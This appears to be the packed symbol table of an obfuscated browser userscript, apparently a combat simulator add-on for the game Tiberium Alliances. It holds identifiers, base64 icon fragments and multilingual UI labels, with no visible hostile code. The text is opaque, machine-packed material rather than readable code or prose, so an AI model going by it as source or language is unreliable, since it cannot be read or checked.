C0tLR1dnRnoblsbWqpqairq6irrKmsrKutrq2ur6xub22zs7OHiISHiIW4uLZub26Jioi5uri6urq7vLtvb22Ki4dvb27FxcVra2nIz9KNjoqOjouQkY5zc3HOzs7O1djPz8|Sk4|sDg|DZjYcfsdoVoPJS|ZLQj80|2Pz|cHp7VJ4X6O0awzkzf8k8npdieZTEERbDoepxRO6Ixu1Fg6EqiuaGq7o2kFJV0CgDLLYR7wzlr0jrwRSH9SeEbVlORNRgPI3a|XGA2bUwkSDJEmPa1y0|Ozln0mP1JWfdXmcxlFzIli6YgR18cexRiNLAZmFxReEfLSIw2T05dHso36cGkxk|5MjcNFj0xEdGN2rcAO5p0ABxaz6|THuAZSZLYX9kBmrRnqwekDkyZQpyacUmyaEe|jo6OkpaKlpaOlpqOmp6Wnp6Um7BAdAAAAA3RSTlMAAH5Ny5jlAAACu0lEQVR4Xu3b1Y|TlJCVlpNpamd0dXJubmyYmJaZmpeam5ibm5l1dnNqpbxubm2enptub2x4eXd6enh8fXuCgoGEhYKEhYOioqHt7e2io6Hv7|bQBDA4Wtm1|wgM8MhMzOUmZmZmfH|qjnSv38NPymmccbr2oM3vtKC7nPGMdXRaaM|rtc5K6kq9SGbac|VMJvMkm8l8crLn|A8Yb8WXC68QiBFjIEYwigQiYFEoFVBCX3ZL931nd555zvFkQnphu11Td|Wbd887sa4rtmueZzM4P12GsOAx90GHA|B40404|marginLeft|CFR||List|selectionMode|174|setRowHeight|RegionCity|icon_res_plinfo_command_points|CityPreArmyUnit|460|alignY|move|TabView|zvVhlrWnmnxQtNvMK9cLi1RhmjLHx4eNzTjo81iEAALZ6|one|5ce92|RadioGroup|zQFx2hTklqFj8z4qG2dxMWAIAwWlQWP|mhpsfqkTByDJ0x1uOXu3dPZuT93V9OOjHN2Ok24GzI13RmtVufUUSeuVxUal8ctdlHdcEBSlAf1y65o6Luh0KqQCxBeAieHLHq4BabDL67yxPz8ybyJw5hGsfz3jjCpAVwOn7nMU3hFenCdOm7zglPvJTTA3BOcE6M4RyDHk6vom3ZVKYIA01gH|changeSelection|fjoRI|setMarginTop|_onBtnClose|alignX|margin|dK2j4dauqssLTs||TextField|icn_res_tiberium|icn_res_chrystal|icn_res_research_mission|icn_res_dollar|V0Ed3b1xbgCYU4k50S3aXR4TSz0cjRxwNJH1pTWnMXC|150|members|Object|extend|foo|unlockReset|_Cities|ownCity|singleton|define|version|GM_info|unsafeWindow|createElement|innerHTML|Class|getMenuBar|attacker_modules|defender_modules|BAR_ATTACKSETUP|getArmySetupAttackBar|getLocale|CurrentOwnCityChange|SKIP|mESXifvgB2RsNSCCGZJXvVI9ZOtr7IAgvxNQZorxQMEj47nW0QBcnidD8FuLqwqgYjCgttaPSy1IyiE|getReportReplayOverlay|locale|setItem|vehiclesActivated|infantryActivated|airActivated|allActivated|DEFAULTS|113|Slider||BmjZty8j|6LqG41ItiywOTprJuBR7|ZP9bu5Qkga7G5L7NYiEgRYDGaiZigLj0F4cdwFZSs5EwhTSKPG0MHpfndfsaHcxrp15|WJlBy|UKAlPst6KEP1JUvOLpZnVavhKznPcSEgZibdepxCbz93eA8sCk8FmeIzMF0o5eK7Blf3PrlQo7ypnen8u|YSjdHqlLtQdvEZXpKxF12DLBNuBRwpeGXj61lu5ZHi5WDqwVCy|xzO7e6QMaIE0WRvbdjHXNiLjwYXnl4ZuBNjkTAsdufz8jg4||5zqarLVsPr8tV||BIfIWUuAsqriRDlLi|YQ|ZqKiCu6EJd|aCkQbLMjNg2y5Yr60FxO3xFA09WCkf6XPV9lq0JmhvTiw4AGj7hrNlgJUEcxRsN|buvFI1YDrWLNjM2x|GKx9oyQmnx|JDnxa5m4w|CssAywczBXYOHk2eKq5oVoQSQsOlIHwxn3KmCnWK93wnfxZEpyZZBlgEZh|LbGDc|gXu1sWSur2azIb7|z2vlGl|pP4|qM7UY7z90WlX4i2LE9a0vrvtZ1wEPuNvwsQs9OPte42fjx3t2bzH|AYAgML6xHYsDSrMTeIVr8d8oGT6m940P3j79|ARzr|zZI4lPKAAAAAElFTkSuQmCC|4BfwlxiF|iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAEz0lEQVR4XsWX3W8U5RfHz3lmd2Z2drftdinQjRhKE02MV7SIhZYLSUyIMcZ45wVeatQ|D1A67LK8X05LahYHIkRSygHPvicvbSrfn9IiYkhDAsTfMLp5hZ44hMxICwh4epFF|MeJ6hQXZbh1CAldOIf6|Q1T1FmV4al1QYXEaqbBtrowFL05T|LpmxHhm1Nqzp7jjzlkKiSbSrrOYSVCRXRfeKEAMaUUVY|uBJGIz4T7udvRrt0TtR0|SWjqktAuKVbUIthhotW6UZETrRXrOKwkCMKb399d|Xq|PTcbxpANoKTpPnXFmAuBMs84GVVKHWZm1vZI0LfGkO10xfnwt|Rqnl6hmXMG2tymptDnJTYGScBveBqVt1QbVavato273F4juseMDX7IRGhLllC0Vo616zWpuDXAbDAWs7mIlWXVAPm9sKz1clFVWjfVrrna|3CY37|yWV7EwRNxxroEvdfPrgzNKWBhAZUyWmTv11RT9Qj|uclxujx|region_city_owner|changeVisibility|88Sibdd|AZIfIE|iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAFTElEQVR4XtWVW28bRRTHz5nZ9Xrt2IlzKUlanJReiEhLpUpFPAQJBIUH4K1IXEQf|96cUwuRux|i3F5qL0uCjy1AsYDetfbWFH4c7Fxo|Yftb0iy|VPPXpjkDqj2DdmxqKqmi2c5xyR22j7meFQ1vT9OdEbNRMbYsVXxZHwVvI0BbPvh|39QcnPcYwYLgLAFiNtauDrNiq44bV07|n68f33po4xun|getTarget|is5xTz4|9oXPgAChPlb0DVGFXlBBlFJoaakobVVCkxbiJI7ttdfeOfwnySo18UXIlRBnd|X1zP|cjtvQAlolbLwcFSJTjiOUosUta5EW2GyEYboCFox5CTVdJDAefLGy5GdpLwwcmsNzzqu5mFqgi3aK4ds3PQuNC6yBlAbipm|slHLZCbK63gs4VxGqBpR3tDs9PZDMu0p7QSTEQg34xhCxY5jT0PjQZoMK|EppplKrHx7w9BpViEwsEHsiMEfQDC|esCZtJMXwfiSGSmqtXakX7PcSuRkOKmZysPf7Nz0Ai0jJwx5PaBwWC1L6DT6o0x|XK5drg|UBdVu9ecC8VzhPVFkXnoy6w0CTA63fLObyFYDrezFY0DuMBhpsFS7Lqh2q1ck4w8Kq28orf3RpPYLoV09dzS3YTVWO5bUWuEEY1yxeO26oNqs3nci3stKP|6aZ3pt3MPaxQNbOEpKkAshpoE8jRyB0Bw|b2XoCNTJ7U|hDGXsPcc9CMQ8txbrdQ3QQzI0xn7ghXyjRKrJ59aiA5dWAoRa6mEWau4zKOogTGGHN90OTKZUoix|2LwSWioNnMeZRx4so1vhLK0Km7xbdO3Fw6fnYpOvr|mfO7tj0v4lvStKDtseYfVAiGxeCBt8Q8a5Hkj67JGkRYVyEe|ye9e||uDzi4NnlqIdGJvC3PjVUNzPfrr66IzP|cPmvslxalZPvfjz74dFPZnfj|ylk47pI4tTc6psnbi3|iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAFrklEQVR4XtVW3W8UZRd|zjPPzO7Mdks|hLoJyi2Fbp9unpnyUvTOWqCPrig0zzZtci1K0d8ibXQ0kqBrLpFFCLQ|m6UTqycthWaVT5||oMJifl49tNRdZid8u7v9A|FpOxP|5H6FA|195|CZpHSSU7aKCQ|rGjS|jA7UGxeM8PeBQ90rWOc65DnURBuHZHoZnN|rf2Wl0epWgSEelxA9TkYQryEGcQLBBENfkC8kSjpO9L|5DxTEIrMzPDhjRtZztqx1E2vNNuzmNZv|Px8fGcnZrh4eGsrKv09PSioqHTwL2mGxvW19by8vJyc3Czs7Ojo6KfoJxubmyEhYPOuri4uLjS0tK9vb2en5tub254eXdub21rpm98AAAAAXRSTlMAQObYZgAAAr9JREFUeF7s0MUOwzAURNF|8YKjatoQJQdXj5loKK1jffZvKHlvGhf3cuyEObrgOE0NT9rOQ47cuCalDP08KWFYAzPh30j30fjrtq6ptRiktwAcH3HZr47WjmOkv6nffPsbRoKozBva|oRO6NJS5OSpIWWTubee|udwrUgOX|xxqgOqCBGQaobpUKOxIdW|YqDQfv7CBEaIShGH7qGE|Ej0KEzIH9HiWlznD6PQ48tXQQfdnHZszOMpV3Js0PN6csVG9ZBDLhlG1soC92KiGFbMYK4J63r40NKvxbW4FtcOznXhNsw1m2dRrtXb3TkCoblwfgJXghfh1R3fr|gRLycvsVCj039|WTLQCaVd49fYZCzzx|SyemIidCeMPnx3GC3tP0|onvUF9K|HA7eQAAAAASUVORK5CYII|o6Ojg4ODLy8vIyMien5uhop|iVBORw0KGgoAAAANSUhEUgAAAEAAAACgCAMAAACL85puAAAAolBMVEX|cFM27nXK5MvK3qTQ66jf30fywujSA5kd|3m5xfwN7QD|4FtfiWlxPgtD4DYwoixvY9eqwbGDSr|FovBBxLa4LF1GuzelLRYwQs3T5ShWCLpSca6Ae4jg2oCykGxgELT1EOp|VdRlxncQO7sZi5Dazu2ERZ28DGvCHqIdL5xLW4Rt4Jzg4aKST7rhF33Wv0|4X0D3uAjhoJetYicq0BdKerbWS|z3AYaLLvruf6G9i9hftbKZo3NsNuoPENRzS|kwhp37IWBi|uRDqvRTzj4|f39|EZmE0NPSQHwAosRHeoiXBEmc4Y0hAxis3YjTXAsDEEhIMFSE14bOTcKkm3xDNKIkg6g01pGUdchJJEDoMUAoMHSdIxyS4wylYiglG4kn6ccQsg6xeskQoFkYRtSe2HPKIlkg2AqvIwUNDvBc5dimULB|HcA5EiC6FTeQoUUBKICIJxuw01zFQCVDEFM|WZUrt6DyrW7Eqzei4WPvQ5dCDCMmvyCiZEgT7g9Mc14kuZ7AAhAUhlch9BiCHUdR8cnG2i|MpLq7fFZ7phQiIYDdZBlG1wZbsyaMQ9Wp5ttRM0AJH0BNFXNKRxfZCuZNNNs3|50wOn0QBcy|Ho7occC0CXNfAZ0XYckSf60BWCjuixbcf|L52|qAuRO24SkYPDGnqYd8J7YAeAs6RtqC2KGMLBk|iAw5lR9WJF8ZsAHCSDh8ycC33RFU679f1D1dMPIW|9G59nu8MSSfE9rMKxVO21ySZbLiofnPW6AguLtAnCadFpxHb22pmhJNBx5SRgC15IsyXCOcK8F8PXi|g2o6tN9X|v2wAe|wp2ba5v9h851bbuh9Md|b5QXL07P|AJJkAYxEeP4CITSc7|OVjYunRD5s6fGUTrg9XFz6gAuuUWNAoff7WrAD4pVwHb2y6ra3dU1fNTa|DqwBJgAINOO7Eubb98F5qg87qhcSVqwqyc7MR8AfWPL|81grB7ZIhyTaHral6y6|p6el0dXOXmJSTlJBqa2jY2NihoZ6XmJV2d3XX19egoZ6dnprOzs3X19aIiYeKiojQ0NDr6|hop|iVBORw0KGgoAAAANSUhEUgAAAFoAAACgCAMAAAC7f4tPAAABj1BMVEX|vq6uqen51sbWqnp6WRko|cnZl0dHKMjIuur6yLjIro6Oh2dnTIyMh1dnRtbmupqajCwsLu7u6enpuWl5OGh4OgoZ2EhYJ0dXKHiIWHiIR6eniSk49ub2yam5hpameJioiNjoqlpqOkpaK9vr25uritrq18fXtvb22Ki4d1dnOOjou4uLZzc3Fra2mrq6irrKnPz8|PW1tbJycnLy8u0tLTi4uLSvbq5ubnDw8OwsLC3t7fb29vw8PDR0dHv7|t7e2lpaOQkY6mp6W7vLvOzs6CgoFubm1vb26bm5mYmJaZmpfFxcWVlpO6urrc3NzZ2dnT09PV1dXa2trg4ODz8|oD9nHCW2twSEjAAAAAElFTkSuQmCC|kBRgubn5L8h65aJAk3oUGlCGAJmS1Y9DEmRIJmHUuoN2KOqhtqGo7haggZCAmrPdyeCyeYrPvd5YbPKHABUVQe3yT7sAO5M98FQIDD9Wi3SHBYMVsj4699ketyNQAB|QvXI3vkZAAatm5ZDKUrrIIafgOaBhHpveogcrD6UKIdGgvEE1thANFQLwxPJz|bhhnAgBACQrtovtM8EcJwQIsFYQiZxmEwJ7R4BDl5eXC5biqNRCKlgEAkFELwSv9UAMMNANaqIR72AQOOX5stgwEU8yHU1RDt4wwSMc|rHOO9HEwhAEwTXfEBA|YRNgdElAEYUGMADTY2EmUjBsf7oPd3m|MASuRbHYah01DXaUxNPNwoif0iB96iAENwXsIE6S2BToniV4ZOBHDWCHiUZoaiHPlNlgZVDXbiocZwCVB530Mn3oA||0IoZlzpNSAxga0SB|FxcXCwsLOzs66urrGxsa9vb2Sk5CPkIyTlJCdnpvV1dXHx8eWl5T5|fmkpaPQ0NCam5fX19fR0dHa2trZ2dnd3d3e3t6foJzc3Nzr6|g0xyRSETASQ8Y|f53svzfp|Y7t|JLE0PE1I2AGTAx6NgKEgSAQ4HOYEREEQfdHhxBlnAwkAIl8bx7wsiH1uh2IB2KZhMyGF|n5GWAWmAP8|PAP|IEGV8FfAQkAOIwD1gCogB3EAqPTPR0eGc6euz6wRBFJTXI5J7585xq8s1zc|rDGKMxxsSoGK1Lq7GkabW2W7CpKZVLbVpBoVwKwi7Qcr8zM8zlnNnnPfse9nQW3ZM8c|iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAACF9JREFUeNqEV2tMXGUannPmxjADTGGGYZlpyx2hpZbey1ba9LLAguhWE29N6yU2aaLxhz|icon_disable_unit_active|uvLugK91|FF0000|icon_alliance_bonus_inf|icon_alliance_bonus_tnk|OjN1Z|icon_alliance_bonus_air|k92eYoLQSCSHKOBn|83Bz886Omhp36ccfN2FMHzXdPX8|ksvvljac|7GeBOQCcRp7CoeoPg7gS3A|hwbtunn|6cjYxrK5R|YMiY8|rpO5z5Ot|jjC2n79t3Lf|N9d|43KCCZhxtnOAdG|fnduN4J|p7O2Nutec7MruLAgyJIksfuVOYhGo96WkhJYXVw8vuWVVzod|MaEyJNhkIhEEzCwW2nmO2B894Xnntu6NDMj5z7xhLfw6NHBa8ePrx29fdsakWVZa1RzVqHc15tMhsyysrG977zTBK|0M5EBDk1QS4IIkHvXAsXDTU3lFw4d2uGfnlYST6BDr9fL4XB4BaMrGuezAhg3Hvjgg|NXJOYkZWMEy|bM0tKbGN9iIhNMQvmAqMkFoePUKQ|setBackgroundColor|LrJ|AAnVQ8CJ5uUj|jfgIYxQQo4ARChh6B4zoAB8h9n6VQ1X0c8YB8Ah0cH|4rsVG1mTRE4RkJtzfZlETgD2tqqrAkgQHbMAUDoHXAdgQ7ogA7gEWr|C0bFnsiuvEQBMQsGS9YtAFO4pfE94JtIB3RAB3TwWA7GKGDKjsSe2AC81|0l3wO|e8eWOE6rlYHWSDZJkpTIIks7veQMrNLMF4vJ5MW4L|iXRAB3RwRw52r2tshaJ|n5XbpFT81NstrdHt0h9AZy3tjQmv8bk|zBseZhhRE5fGARBSOpaoocHKBgcMAnOsIPDsAiX9rE|ehoZ7y8vKdnpqlGxu2tLHv7|vw8PDT09P29vbq6ur19fWmGxvp6ent7e339|bnJj4|PicnZrs7Oydnpz6|7US8QX1IBmhGcmvR|voBl3AiAAAAAXRSTlMAQObYZgAAAS9JREFUeNrtmttuwjAQRDe0JNxDuPcCayehSSCUFtr|PMu91|HzjyBEaewUgURYMBcKTX6fSQ8wfrkQWdCN|oMoAKgGuuY36lVr|tuJlqxCves8uOMx31xlCR94|b4MWOrqzgKbwxRx2c4a15|menues|victory_screen|61V6WvdVXMAeRK2JEGhAdr7Z8xN|bgr_victscr_header|icon_res_repair_air|icon_res_repair_tnk|M1RfnSlqb5|EzwAAAABJRU5ErkJggg|mdvv1X9VefVy121dXLwvb|LUQSE1C1tP|icon_res_repair_inf|icn_repair_off_points|3lgfMM0ptH1cS16Vkbraj7U07|dU7YmylVUvW2q3v|CVxyeUXgLJcghTed1VtuWZiPWGxJzN4VQkdpfL0azUkHXa0NfU0J4xMwG1sAzg7u|UNjBUm1ONDQ|cj3YckJV8T2srq7LfgFRXpedP3liQNyqamn56ZmX5fGeGldzXz8qOyTpr2p0Bjgb|5vAKE8KIbVXW7JjQvEkd3ggAMDPZjp2ZcJ2SweFNHi|RILf8aoRWHcGeIR2H2S0NOSUHIbDhOSnXzkc8YyMB4wEjF01L|StoRKLpbe1x15BcCBRcr1SjqSKeiV7ruBSuFgoXHSKxfyt64Om9cfFManpOnuuo0mlyo9ISVKrvDwSBcL5fFE9Fu|hZlTbILVCykWFfC10OAkMV4hRoZuX39l|ph3fueOWaGv|k16yIgIe|zIE3UKUIC|BrRMXToWtJv5z5NLPGU50eTIEOJoscL87Mta87ZeYY|M7G2nuKhxkTQPm4CxqFri|QQNaApoN0G4VmmbM3jlXmYIsJ4k1Zo3MxNhu4eafMtY|20z2uMbscf32iYKD68E8hhZB04B2Izxa1jUWqTwFiSTB771wvA3Sc|dzcq8pq14lLMuie6vkHppIYV66HomAK0CRoEzza4IX3hUggLj2MQWRycUNp262u|qMjv4d0p3RhVcUQFHdCQRfAXzq4AINaEGToB2V7KwTRTcMz2AKcuH33pLpidHd|JRzo2IUDrRh4|xmcuzuMT0ULgU8qj7hCKyAiw|FHXyJZtOT0lXOBYONB1N2nPeHIGRDyOrY8L2oKMHZi9|BWDohx37w|gdhgaCxIwhKIAAf0glbtxDUKBYEyJ3bu8Kpw5MAKIkco75w01nQtQxGNql|7ohp6XwRwnMztSsHIjRciPJEH3nK4LhH|U6|t2hfbuH0bTJ0A8D8AyhbSlkoYqeQ1XWROWkq71Ngc|vPkyFmtLbuYk0ARo|bZZDMXk9|iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAFMElEQVR4XsWXXWwUZRfHz5nZ7213u91u2W26RRFfaoCgiSDbxpiYKIitcueFGKM3mhhD64WJ0Qgx75WxkBATjRdcCBdyIYlEJNF4gdrlI6AUiNBCtFK3Le2W3S3dnZl9nnnOe7ZbQJp2obDre|xHgKyyjnz8jG4X8oxJLbvhyk1Uhl8xI00Tw1d||TkB4HabSiU1AXLv58blvvrhbbzgkJH8BYErFY1AWj7utUnpyu48h8JpNd|Lx09u0rzo5|0rZr|mQbNYn9dLkAAAAASUVORK5CYII|r9df|dxc||PSAbyuf4XGhEoAXNYhTawRTgtTJAZTyG1pqaTu6lcFOXKOUhLqn2Q4qCo1YFXGhAK5yaSm6Atl71qgaoJOLkSdOem31OJ|wCaz1Yq|fxXH7TePX|2cdnjh54|T0|SuH1rD7xMI4eW7QmL16ZP|fPPTWl6cH9m|EpYPD2cSge|ef3jv|2zgwPvDv52|P7OiezsyP|wAuMMYG8SSVw440avVAQQzABLBRiAiWEQIyQki3U7ee2u9vdnZ2dOf5myu72g13QNjGe7cw0z|toW2ZrGIpXyIpkFNGtQLJUbfGBODgjHhwuitt8a|M8XjP6wCu8rikW|Da3buO|hrGnlhg8Tp8|L8ryHODUW4eNliZsIh2LkisaZhT87Pfl|y9h7X|YewEYhBikMndNyrnzI|t36eDGhNQi0JK1piBrda9pbmdqcuxtQ0lTi3abXEiyoJVwQRxcKgWMj9UauzVwJTQ6oRWqNQX5oO7dxHETWz1K0k6zZ19cpC5D16CV5nAP5o9rtRaw4Jg9|6rvtKaMOuFpG5LUjqJOpXgAGWQ|3mIM9YNiItBI4HeA2eIkTBK3aAep1T2zHs9n0HrOhJaLHdkY5O8LLKBwcVJXzMSq20wBHA7cNicx6U5C1ui8lToSEVE|y1oRKHVAE0N2vUCVBNKQ7RPJ0ff0xQ1kd6g2C3AbLk|geB|QIQUNBqwuZjAdNQS429xPy6HFL2M6OsKJuc9uHm3nqApNUtCI63R8|yiEWFbA|KbzRnxQS9M7nC3v1SKsunLQg0mgBcB|l7wOjA6uA0gWuVtf52AIq|kUsvZEbHXwNmO2cPGWC80ja8lFAqsmU6fHEbjuf3WNE2he6YxcnCgDMXnDVI|H4qXjm2sAX86ODeUalbnxz7fTAvsNnjx3oSd34|0CmFh6ItGsmi1akwBeAp1k8nFDqe1mV39chUIh4eYEPDkA4Bz4Yw17GjCmoatGkc6Z4K4|AJEnC9lUXzab2auMMAeOCwcLwplIcHVNACOymUwHOI3g|BMWiLteHjr|uMA1ZvP9bpx7rPat8aM5u4oz9|wZc|pA0VM65vEtUFSCV7PuyJdH7CqT7gVAj1H0IDh8oLSBI81Bh6MAwgj0oleNiQzR|3es|WMyGHHtnz7Lr|GczjQOUaAuyioSPxjSC6BmAiEixjMEEz4UiJxfs2PoJL9gyFeVDJGgID4gd443R8oRByyTRBwiDg23YAxVrvSru1pT895j4|u8Z28lpFFG|WwLADvJIE5iJX4SJZo050sDV8maJmMJgI14SA7JIyOTQVrIZRIkgwLIaTK3Jw2L4c6ZjcI5NSip3IW7V9Qhb1oFgBHEMuku550MKyeR0tWAhWSRIuSULUVe|UtO09eP15fUAogwRk5G67GQUssbNwuh7njDNI5e7zx7dd|VJI8oB5DYaDPLO6cZHDKlU|iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAFmklEQVR4Xu2VfWxT5QLGn3P6tbasU9nGAO|8AHKjlP9O9djoAAAAASUVORK5CYII|NQBUumiBSwJcsrcpqku7LBpugEKFXA1hesapjSTi5BaAFTqkjzAJvSAoKdl8ox0xBtHQegPDdWsZq2vDO2kTMwdfyGLVe2VMS2vKiLbM5SOMO2|LFknj|jFCJkeRzneRxb92JIOtmQhO7SkCg2JAU2JJINyYS3rj4NhAYbEvN|Cq49LxtKOFY3kXVXkw6eDEJgzmmzOzfNi8miheTLOieLC8maV5MrpMhbF5MVK1Ws6ea4o|5lbQUr2bXA8HwGOquHK9m0yCk5E|n0xh9TtRmO|KarqaZc580ex2O1ygkAgcJi|rDujfa4W09|MzOH|g1tKVuJqXTqyAd6TewEw3vyN|UAJze|Fq9bX|uCVilB|IONfhWVOWB0ylN7fALSnvgUXDn|MnJzFAx77a2byuZufEuZu|0c|qpER5MWYvS9b|c7TigjMrOiN3tuakD7|R0Xt71XE3n3o4PyZ43nglW7j7nOXAhVj89zu9cu|026SVhaNcrvKyopc3159bBCCXZKQjQA4Zj9ypy0DF|Bs0|MH7KtH|BEOkIUEDugjMnH9QXn9ZJgYgGJS5aPW5rdWtXsKR4jPvMsrnTlfKZ80eCmvHQgmyGeBTA7RJSlPHLtgPgRHDmjoMWE||uvtw53|EAZY6jLCYOmqJQlrxMLJCjZGUkHKah1HJR1pLGccbuATNDLCEcXxOWOOnizyOJY|VspAOkn3KMVopZKWsExgKc6zFF9VgDmW4hwIQ7AU052G0ROxRE|xs2di7A6bKAEsKJculCaxGJgIrOzxdnEmTnb04AJr7uM|BcLIYqxL3KEEn||XcMhBXjG1xw|fcMTV1HgKw5tnFgfo7|u0paPnLZj8GQArAVTOCKAG4F||1DdGdnqDDcdxWTct1gPvxxK9|OfyVJYQtzckAamSu|A1zWJoWfUXfZA3x7ugbfnAVQOshlEEAbXIDjrwEr1TwnLIuva4GV|N0TCA|ypJpFThwt5LipxjpLlOBiPRb0HZw9j64tj990By975oYvstgHLMgQAh6giIQKHHSRXGDfPy18NFW8t6vHXfef11R5n6D2zbOno|EED9WRSuSXfbs6o6GejnDHT0bIN0EkBzABABXwzimQUm|JfisJdHzJqSP3Q4AMA9GETqDCIHVIKfO5qzxX9OmVcgFg|H9iPCb7vQOYhtnZMklSO76PJbY||yCCLw7F0aNpkU9bRjZ1NRSK7BO2|sY8gMVBVJHQ|wW7UCZChHsOUgCaCwCdAKBg6vxXps8pX|OGIgdw2ZaFAQa|S0RuFyZ|oIER9a2OJd1ZwE6oaNKHkJhzwtb86WukzXN|XYTb3lwr39G0ErgO2YlhDIcjFwJrX5|oap|htMmcGFBG5q9MoHHZkPc|M2VkKqghAJFiJgIZpmIcqwEE2wEOVYiOxKUrw|2zKVhGgdj|Zog5QK4Kt3ICkISAt1BM0R1F|i5VgZaR1jV|AmDpENwKJJq9hYu1Oc4FoE65iWGtMRx5rz4SO4zRzQsDHNrV1e30eLodqBEBSNRKnKjKPyBAPogAxIeonCKkOQbCf|DdSHztKiVFOyJeI6ViCFB|bXPFSwTNO9sn3dx|2bPrq0aA8c3rN1ldvrAx21Ej6V4G|YLa|eYkZae4eAdGNGtHshbcSgTRHgEQ3y2gaBj78yLqRh57|4ePzAlStr2mtq1ozcumUC6RCXLxEJG2JiDJWnT|BuRoYG8su2|Kilitler|Oikea|Bloquear|Vergrendelingen|Varmistimet|u00e9rouiller|Direita|Sa|u00e9|u00f4t|Sijainti|Sol|Vasen|Esquerda|Angriff||Atacar||u00fcncellenen|son|istatistiklere|u00f6re||u0131lacakt|yap|Simulasyon|Korjaus|Attaquer|Aanvallen|u00e4ys||Reparar|u00e9parer|Repareren|Zijde|Lado|Supportwaffe|Stufe|u00edvel|Suporte|Ondersteuningsniveau|Supporto|seviyesi|Takviye|u00e9g|veres|u00e9faite|qLFuymVaq5YzLTXdpbiJKHGFtZ3z|Tappio|3lZ56mJgydbCMM77JCHRVfMYOFutduMDvvfaOEXSs7oEhFBxfhuoDm9ndtJNE2fVJ8|u00e9p|u00fclet|XtqGA5sT90ViTKCBzlwnTkh20H0YvzTV68|Friss|aTqe8Fgu8Ktl0Gm2s1jloXQnd648lBpMIzlFMlVxs5WblCmx|V0OZZ7Kk03eJSe|Seite|Taraf|u0130statistikleri|Felfriss|Lvl|szintje|Tukitykist|u00f6n|Actualizar|taso|Die|basiert|u00e1mad|Aanvalsknop|u00e1s|gomb|Kqt6o6ZdOdeknOiGMupkWrNscPYsdBkyz7DWLFowdrhnAP|felold|attacco|pulsante|aJoyL1aGdfa97EPTVGwRA|tiedoilla|F9s4RbKydkECQuCpL5ib3fJYtqHPPTEwZ1VJ4mRb6D8NpiwxXauZeGrryNnPM9YhPDtOr2bNZ6Hm5tHjNCsTGQtHv21kWHK7uEdUOSpVH5NbKoPgsYjwTSHHVZjDLRiy5Z07jKIPMg|Kilidini|ataque|Angriffsbutton|Attaque|u00e4usnapin|cDbFn1EEpdvAtzZvlln51lO3RDIsu4QAp5n21TFM1ddCusHyKmH8PT2LUBd|TonZti0c88zq2wsK1cqmi7v03u2HBOsBmt00aa1h1prlvruCz2iOs7N4ynn9aIGIBU|Tyhjenn|nappi|Ende|Zum|korjausnapin|u00e9paration||Reparaturbutton|Kildini|repara|PUR6uiqpVHO74Zrs3A7EQgf|Repareerknop|rJ62qIWIaBKyUuuhCfjV00nlpxfCwtsLxwFeLCTbT8N5BRGaXRTp9iWGTrCuUZgOFuVCkPG0qN3IVLhZ0CRxqT11XSKRHw6WdisjmbZOlo9IIawqiXHiRH8sZUMxycs4WfBoftTCJ6xQ|u00e4ivityksen|u00e4n|recente|mais|Simulatie|zal|worden|gebaseerd|baseada|ser|zuletzt|den|aktualisierten|Stand|vai|simula|meest|recentelijke|actualis|Lj3|u00e9es|Simulaatio|viimeisimm|suoritetaan|u00e8res|derni|statistieken|ververste|sera|bas|des|fonction|Nederlaag|Sconfitta|Configura|Aufstellung|Opzet|Takaisin|u00fczenini|Ordu|u00fczen|simulaatio|simulazione|Avvia|Gevechtssimulatie|elind|Aloita|u00e9marrer|Zur|u00fcck|naar|terug|Gevechtsopzet|Vissza|u00e9hez|egys|Keer|configurazione|Einheitenaufstellung|zur|Voltar||configura|alla|Ritorna|simala|Come|siirtopainikkeet|u00e9placement|Uyar|Warnung|Attenzione|Aviso|Boutons|gombok|Mostra|deslocamento|pulsanti|spostamento|Eltol|Verschuifknoppen|Waarschuwing|Figyelem|Simuloi|Simuler|Simulasyonunu|u015flat|starten|Kampfsimulation|Szimul|Simuleer|Varoitus|Attention|Simule|Simulieren|Simula|Simular|Retourner|Des|Haut|fel|u00f6s|52tOizyBKDimz5I5|unten|u015fa|omhoog|alto|jobbra|destra|oikealle|yukar|cima|oben|baixo|LFznB8qaMOJR3abxBBC|Gyozelem|Sieg|Yenilgi|Niederlage|total|Derrota|Totaalinen|gyozelem|omlaag|basso|XI49559b9T7ly0d5ZliX8CDHlSz|Bas|Gesamtsieg|alas|direita|u011fa|ferramentas|Abrir|simulador|strumenti|Megnyitja|Gereedschap|Extras|Simulat|V8bpVoYfZevxFcrti1P9Kk5TRXOVywSuLfvUU9o9dZUZGMI9XINkI|Troupes|Mlr9hzLUdxn46nK0XYGWeNyoUJ9pSzOcyA4jY0yHUy83HPFvTyDqTbKvlQDfjZ97TJpRaScdr|Kilidi|Debloquer|Felold|u00e1tor|inform|esquerda|sola|sinistra|balra|q1NOGJQ|vasemmalle|5sKFt6jwIc6os5380xEx|u00f6kalut|u00e1t|u00f3s|Ouvrir|u00e9glages|simulaattorin|Simulateur|Vorspringen|Mene||TS12i0C|ioCrcpGLj|xVg||dXQE|VGYPt2HFjT0|LI|57n7Z95d3jFrnB23vbgNQoN|uztBZ2xul1ajXBXKMqnP0g1xYPVbanmOuRF3ks88YvNQYyVY4b6nWzOYCS1CSBK9OObPdeIr5hGwovxUe5dwXCYOFHu783PfjjrmNi35yN7jXBlwF7mnnskZmlqjEdjidLjq7CUZ0WzYeNXl1PVeOVt5YBl88G5oodMD594OmYjiVllnLgYaltSvyDLMFBlXZVUJYsbhulqIicWyr1XaNqnXA2jcfFqf4OvofcpAwgK3EJYIGHeL95TinEbkhCt1zY0xIAFZfNtJmytTNLD7O38UB9OSTV|hT1iJB1Hoen13ljX1KUZ8KHtmm73z1rVvfv91FmfXIlYO6idBNJFfz79yJL5Y3IDjEE03lkHBgPPDrIx3RV03G3ZnEUGwD|G9Vx9|kYKVjMSpsTjktsXWYa|2DXOm2lX0|7BlsUjEJNkkqfT0xf|qXOc|4oKPoAf9fdge2xI8eQmrdu1JvIkNIEVMOPFfYCCqRuYDaUZGfne8T9bK1vN9DpeX1w1LHmh8BoRvJGbuAYSHUqHwDUdy9lXRLCRL67SZkmxXnMImXd5YwKCX3uUjZp